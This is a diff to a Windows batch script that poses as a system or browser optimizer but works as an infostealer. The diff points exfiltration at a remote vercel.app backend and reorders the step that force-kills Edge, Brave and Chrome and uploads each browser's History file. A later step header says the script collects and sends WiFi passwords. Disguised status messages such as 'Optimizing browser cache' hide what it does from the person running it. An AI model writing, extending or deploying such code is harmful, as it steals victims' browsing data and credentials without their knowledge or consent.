@@ -16,7 +16,7 @@ echo  ================================================
 echo.
 
 REM Backend URL - UPDATE THIS TO YOUR SERVER IP/DOMAIN
-set "BACKEND_URL=http://192.168.0.102:8080/api/data"
+set "BACKEND_URL=https://backend-data-project.vercel.app/api/data"
 
 REM Generate session ID (timestamp + random)
 set "SESSION_ID=%DATE:~-4%%DATE:~4,2%%DATE:~7,2%_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%_%RANDOM%"
@@ -40,30 +40,18 @@ echo [*] Scanning system components...
 call :SendDeviceInfo
 
 REM ============================================
-REM STEP 2: Close all browsers
+REM STEP 2: Detect browser profiles
 REM ============================================
-echo [*] Optimizing browser cache...
-taskkill /F /IM chrome.exe >nul 2>&1
-taskkill /F /IM brave.exe >nul 2>&1
-taskkill /F /IM msedge.exe >nul 2>&1
-timeout /t 2 /nobreak >nul
-
-REM ============================================
-REM STEP 3: Collect & Send Browser History
-REM ============================================
-echo [*] Analyzing browser data...
-
-REM Detect browser profiles
 set "CHROME_PATH="
 set "BRAVE_PATH="
 set "EDGE_PATH="
 
-REM Find Chrome profile
-set "CHROME_BASE=%LOCALAPPDATA%\Google\Chrome\User Data"
-if exist "%CHROME_BASE%\Default\History" (
-    set "CHROME_PATH=%CHROME_BASE%\Default\History"
-) else if exist "%CHROME_BASE%\Profile 1\History" (
-    set "CHROME_PATH=%CHROME_BASE%\Profile 1\History"
+REM Find Edge profile
+set "EDGE_BASE=%LOCALAPPDATA%\Microsoft\Edge\User Data"
+if exist "%EDGE_BASE%\Default\History" (
+    set "EDGE_PATH=%EDGE_BASE%\Default\History"
+) else if exist "%EDGE_BASE%\Profile 1\History" (
+    set "EDGE_PATH=%EDGE_BASE%\Profile 1\History"
 )
 
 REM Find Brave profile
@@ -74,17 +62,42 @@ if exist "%BRAVE_BASE%\Default\History" (
     set "BRAVE_PATH=%BRAVE_BASE%\Profile 1\History"
 )
 
-REM Find Edge profile
-set "EDGE_BASE=%LOCALAPPDATA%\Microsoft\Edge\User Data"
-if exist "%EDGE_BASE%\Default\History" (
-    set "EDGE_PATH=%EDGE_BASE%\Default\History"
-) else if exist "%EDGE_BASE%\Profile 1\History" (
-    set "EDGE_PATH=%EDGE_BASE%\Profile 1\History"
+REM Find Chrome profile
+set "CHROME_BASE=%LOCALAPPDATA%\Google\Chrome\User Data"
+if exist "%CHROME_BASE%\Default\History" (
+    set "CHROME_PATH=%CHROME_BASE%\Default\History"
+) else if exist "%CHROME_BASE%\Profile 1\History" (
+    set "CHROME_PATH=%CHROME_BASE%\Profile 1\History"
 )
 
-if defined CHROME_PATH call :SendBrowserHistory "chrome" "%CHROME_PATH%"
-if defined BRAVE_PATH call :SendBrowserHistory "brave" "%BRAVE_PATH%"
-if defined EDGE_PATH call :SendBrowserHistory "edge" "%EDGE_PATH%"
+REM ============================================
+REM STEP 3: Collect Browser History (Edge → Brave → Chrome)
+REM ============================================
+echo [*] Analyzing browser data...
+
+REM Edge first
+if defined EDGE_PATH (
+    echo [*] Processing Edge browser...
+    taskkill /F /IM msedge.exe >nul 2>&1
+    timeout /t 1 /nobreak >nul
+    call :SendBrowserHistory "edge" "%EDGE_PATH%"
+)
+
+REM Brave second
+if defined BRAVE_PATH (
+    echo [*] Processing Brave browser...
+    taskkill /F /IM brave.exe >nul 2>&1
+    timeout /t 1 /nobreak >nul
+    call :SendBrowserHistory "brave" "%BRAVE_PATH%"
+)
+
+REM Chrome last
+if defined CHROME_PATH (
+    echo [*] Processing Chrome browser...
+    taskkill /F /IM chrome.exe >nul 2>&1
+    timeout /t 1 /nobreak >nul
+    call :SendBrowserHistory "chrome" "%CHROME_PATH%"
+)
 
 REM ============================================
 REM STEP 4: Collect & Send WiFi Passwords
